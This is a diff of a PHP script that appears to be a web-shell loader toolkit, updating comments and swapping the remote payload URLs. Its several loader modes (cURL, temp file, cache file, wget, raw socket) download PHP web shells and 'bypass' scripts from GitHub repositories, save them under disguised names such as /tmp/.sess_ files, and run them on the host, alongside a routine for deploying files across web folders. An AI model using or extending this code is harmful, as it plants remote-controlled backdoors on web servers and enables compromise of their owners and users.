@@ -60,22 +60,22 @@ function deployFolder($folderName, $files) {
                     $scheme = $_SERVER['REQUEST_SCHEME'] ?? 'https';
 
                     if ($filePathReal && $docRootReal && str_starts_with($filePathReal, $docRootReal)) {
-                        // masih di root web utama
+                        // root web 
                         $relativePath = '/' . ltrim(str_replace($docRootReal, '', $filePathReal), '/');
                         $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
                         $url = "$scheme://$host$relativePath";
                     } else {
-                        // ambil domain/subdomain dari nama folder yang mirip domain
+                        // domain/subdomain look like
                         $maybeDomain = basename($htmlPath);
                         if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', $maybeDomain)) {
                             $url = "$scheme://$maybeDomain/$folderName/$fileName";
                         } else {
-                            // kalau belum juga, cek parent folder
+                            //  parent folder
                             $parent = basename(dirname($htmlPath));
                             if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', $parent)) {
                                 $url = "$scheme://$parent/$folderName/$fileName";
                             } else {
-                                // fallback terakhir: path fisik
+                                // fallback
                                 $url = $filePathReal;
                             }
                         }
@@ -186,7 +186,7 @@ switch($mode){
     // --- Loader 2: Refactored cURL (robust + fallback) ---
 case "curlman":
     function load_content() {
-        // dua varian URL (canonical + refs/heads)
+        // (canonical + refs/heads)
         $base = 'https://raw.githubusercontent.com/6ickzone/Gaje-Project';
         $path = 'kerang/explo.php';
         $urls = [
@@ -265,7 +265,7 @@ case "curlman":
 
     // --- Loader 3: TMP File ---
     case "tmp":
-        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/bypass.php';
+        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/YamiRoot_Series/YR_bypass.php';
         $tmp_path = '/tmp/.sess_' . substr(md5($_SERVER['HTTP_HOST']), 0, 10) . '.php';
         if (isset($_GET['reload']) || !file_exists($tmp_path) || filesize($tmp_path) == 0) {
             $payload = file_get_contents($payload_url);
@@ -280,7 +280,7 @@ case "curlman":
     // --- Loader 4: Cache File ---
     case "cache":
         $tmp = 'cache_ym.php';
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/yami.php';
+        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/YamiRoot_Series/YR_VGmini.php';
         if (!file_exists($tmp) || filesize($tmp) < 10) {
             $code = file_get_contents($url);
             file_put_contents($tmp, $code);
@@ -304,7 +304,7 @@ case "curlman":
 
     // --- Loader 6: WGET + Include ---
     case "wget":
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/simplebypass.php';
+        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/random/simple.php';
         $tmp_file = '/tmp/sess_'.md5($url).'.php';
         if(is_executable('/usr/bin/wget')) {
             $command = "/usr/bin/wget -q -O $tmp_file $url";
@@ -323,7 +323,7 @@ case "curlman":
     // --- Loader 7: Socket ---
     case "socket":
         $host = 'raw.githubusercontent.com';
-        $path = '/6ickzone/0x6ickShell-Manager/refs/heads/main/yami.php';
+        $path = '/6ickzone/0x6NyxWebShell/refs/heads/main/void.php';
         $port = 443;
         $fp = @fsockopen("ssl://" . $host, $port, $errno, $errstr, 10);
         if ($fp) {
